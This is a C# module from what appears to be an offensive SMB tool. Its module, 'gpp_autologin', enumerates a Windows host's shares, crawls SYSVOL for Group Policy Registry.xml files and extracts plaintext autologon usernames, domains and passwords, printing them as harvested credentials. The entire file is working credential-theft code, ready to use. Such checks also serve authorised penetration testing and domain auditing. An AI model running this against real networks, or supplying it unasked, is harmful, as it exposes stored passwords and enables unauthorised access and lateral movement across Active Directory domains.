using System.Text;
using System.Xml.Linq;
using Titanis;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Mswkst;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// </summary>
public sealed class GppAutologinModule : AtlasModule<Smb2Client>
{
	public override string Name => "gpp_autologin";
	public override string Description => "Searches SYSVOL for Registry.xml autologon credentials (DefaultUserName/DefaultPassword)";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		RpcClient rpc = ctx.Services.CreateRpcClient();
		ServerServiceClient srvs = new ServerServiceClient();
		string pipe = srvs.WellKnownPipeName ?? "srvsvc";
		await rpc.ConnectPipe(srvs, ctx.Client, new UncPath(ctx.Host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		IList<ShareInfo> shares;
		try
		{
			shares = await srvs.GetShares(@"\\" + ctx.Host, ShareInfoLevel.Level1, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}
		catch
		{
			shares = await srvs.GetShares(@"\\" + ctx.Host, ShareInfoLevel.Level0, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}

		var sysvol = shares.FirstOrDefault(s => string.Equals(s.ShareName, "SYSVOL", StringComparison.OrdinalIgnoreCase));
		if (sysvol is null)
		{
			AtlasConsole.Warn($"{ctx.Host}:445", "(gpp_autologin) SYSVOL not found");
			return;
		}

		AtlasConsole.Info($"{ctx.Host}:445", "(gpp_autologin) Searching SYSVOL for Registry.xml");
		List<string> paths = new();
		await SpiderForRegistryAsync(ctx, "SYSVOL", paths, cancellationToken).ConfigureAwait(false);

		if (paths.Count == 0)
		{
			AtlasConsole.Info($"{ctx.Host}:445", "(gpp_autologin) No Registry.xml found");
			return;
		}

		int hits = 0;
		foreach (var relPath in paths)
		{
			cancellationToken.ThrowIfCancellationRequested();
			try
			{
				byte[] data = await ReadFileAsync(ctx.Client, ctx.Host, "SYSVOL", relPath, cancellationToken).ConfigureAwait(false);
				string text = Encoding.UTF8.GetString(data);
				if (text.Length > 0 && text[0] == '\uFEFF')
					text = text[1..];
				if (!text.TrimStart().StartsWith("<"))
				{
					text = Encoding.Unicode.GetString(data);
					if (text.Length > 0 && text[0] == '\uFEFF')
						text = text[1..];
				}
				XDocument doc = XDocument.Parse(text);
				// Look for Properties with DefaultPassword
				var props = doc.Descendants("Properties").Where(p => p.Attribute("name")?.Value == "DefaultPassword");
				foreach (var prop in props)
				{
					string password = prop.Attribute("value")?.Value ?? string.Empty;
					// Find siblings for username/domain
					var parentProps = prop.Parent?.Descendants("Properties") ?? System.Linq.Enumerable.Empty<XElement>();
					string username = string.Empty, domain = string.Empty;
					foreach (var sibling in doc.Descendants("Properties"))
					{
						if (sibling.Attribute("name")?.Value == "DefaultUserName")
							username = sibling.Attribute("value")?.Value ?? username;
						if (sibling.Attribute("name")?.Value == "DefaultDomainName")
							domain = sibling.Attribute("value")?.Value ?? domain;
					}
					if (!string.IsNullOrEmpty(password))
					{
						AtlasConsole.Success($"{ctx.Host}:445", $"(gpp_autologin) {relPath} -> {domain}\\{username}:{password}");
						hits++;
					}
				}
				// Fallback: raw scan for DefaultPassword/DefaultUserName strings
				if (hits == 0 && text.Contains("DefaultPassword"))
				{
					AtlasConsole.Info($"{ctx.Host}:445", $"(gpp_autologin) {relPath} contains DefaultPassword (raw): {text.Substring(0, Math.Min(500, text.Length)).Replace("\n"," ")}");
				}
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{ctx.Host}:445", $"(gpp_autologin) failed {relPath}: {ex.Message}");
			}
		}
		if (hits == 0)
			AtlasConsole.Info($"{ctx.Host}:445", $"(gpp_autologin) Checked {paths.Count} Registry.xml file(s), no credentials found");
		else
			AtlasConsole.Info($"{ctx.Host}:445", $"(gpp_autologin) {hits} credential(s) found in {paths.Count} file(s)");
	}

	private static async Task<byte[]> ReadFileAsync(Smb2Client smb, string host, string share, string relPath, CancellationToken ct)
	{
		await using Smb2FileStream stream = await smb.OpenFileReadAsync(new UncPath(host, share, relPath), ct).ConfigureAwait(false);
		using MemoryStream ms = new();
		await stream.CopyToAsync(ms, ct).ConfigureAwait(false);
		return ms.ToArray();
	}

	private async Task SpiderForRegistryAsync(AtlasModuleContext<Smb2Client> ctx, string share, List<string> outPaths, CancellationToken ct)
	{
		var queue = new Queue<string>();
		queue.Enqueue(string.Empty);
		const int maxDepth = 6;
		int visited = 0;
		const int maxVisit = 600;
		while (queue.Count > 0 && visited < maxVisit)
		{
			ct.ThrowIfCancellationRequested();
			string rel = queue.Dequeue();
			int level = rel.Count(c => c == '\\');
			if (level > maxDepth) continue;
			List<Smb2DirEntry> entries;
			try
			{
				await using Smb2Directory dir = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, share, rel), ct).ConfigureAwait(false);
				entries = await dir.QueryDirAsync(ct).ConfigureAwait(false);
			}
			catch { continue; }

			foreach (var e in entries)
			{
				if (e.FileName is "." or "..") continue;
				string child = rel.Length == 0 ? e.FileName : $"{rel}\\{e.FileName}";
				if (!e.IsDirectory)
				{
					if (e.FileName.Equals("Registry.xml", StringComparison.OrdinalIgnoreCase))
					{
						outPaths.Add(child);
						AtlasConsole.Info($"{ctx.Host}:445", $"(gpp_autologin) Found {share}\\{child}");
					}
				}
				else if (!e.IsReparsePoint && level < maxDepth)
					queue.Enqueue(child);
				visited++;
				if (visited >= maxVisit) break;
			}
		}
	}
}
